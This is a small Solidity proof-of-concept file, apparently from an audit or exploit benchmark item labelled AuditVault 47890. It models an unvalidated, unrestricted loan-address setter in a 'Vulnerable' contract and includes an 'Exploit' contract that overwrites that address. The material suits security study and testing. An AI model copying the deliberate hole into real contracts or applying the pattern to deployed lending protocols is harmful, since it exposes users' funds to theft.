// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 47890: OpenTrade rollover loan-address validation. Reduced local model preserves the reported state transition.

contract Vulnerable {
    address public loan; function rollover(address candidate) external { loan = candidate; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        address target = address(0xBEEF); bug.rollover(target); success = bug.loan() == target;
    }
}


